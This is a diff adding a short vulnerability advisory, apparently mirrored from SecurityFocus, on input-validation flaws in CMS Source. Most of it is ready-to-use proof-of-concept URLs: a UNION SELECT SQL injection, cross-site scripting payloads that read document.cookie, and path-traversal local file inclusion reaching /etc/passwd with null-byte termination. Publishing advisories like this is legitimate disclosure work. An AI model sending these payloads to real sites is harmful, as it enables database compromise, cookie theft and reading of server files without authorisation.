@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/42437/info
+
+CMS Source is prone to multiple input-validation vulnerabilities because it fails to adequately sanitize user-supplied input. These vulnerabilities include local file-include, SQL-injection, and cross-site-scripting issues.
+
+Exploiting these issues can allow an attacker to steal cookie-based authentication credentials, view local files within the context of the webserver, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. Other attacks may also be possible. 
+
+http://www.example.com/home/demo1/index.php?target=articles&subtarget=Article_Detail&selected=50+union+select+user%28%29,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+--+
+http://www.example.com/home/demo1/index.php?target=search&subtarget=top&searchstring=%27/**/SQL_CODE
+
+http://www.example.com/home/demo1/index.php?target=articles&subtarget=X%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+http://www.example.com/home/demo1/index.php?target=search&subtarget=top&searchstring=%3Cimg+src=0+onerror=alert%28document.cookie%29%3E
+http://www.example.com/home/demo1/manage.php?target=Home&subtarget=top%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+http://www.example.com/home/demo1/manage.php?target=./../../../../../../../../../../../../etc/passwd%00
+http://www.example.com/home/demo1/manage.php?target=./../../../../../../../../../../../../path/to/php_file%00
+http://www.example.com/home/demo1/index.php?target=./../../../../../../../../../../../../etc/passwd%00
+http://www.example.com/home/demo1/index.php?target=./../../../../../../../../../../../../path/to/php_file%00
